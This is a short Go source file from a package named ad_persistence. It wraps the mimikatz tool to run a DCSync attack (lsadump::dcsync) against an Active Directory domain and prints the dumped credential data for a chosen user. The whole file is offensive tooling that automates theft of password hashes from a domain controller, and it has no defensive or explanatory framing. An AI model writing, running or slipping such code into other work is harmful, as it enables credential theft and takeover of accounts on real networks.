package ad_persistence

import (
"os/exec"
)

type DCSyncPersist struct {
Domain string
}

func NewDCSyncPersist(domain string) *DCSyncPersist {
return &DCSyncPersist{
Domain: domain,
}
}

func (d *DCSyncPersist) Persist(username string) error {
cmd := exec.Command("mimikatz", "lsadump::dcsync", "/user:"+username, "/domain:"+d.Domain, "/csv")
output, err := cmd.Output()
if err != nil {
return err
}
print(string(output))
return nil
}
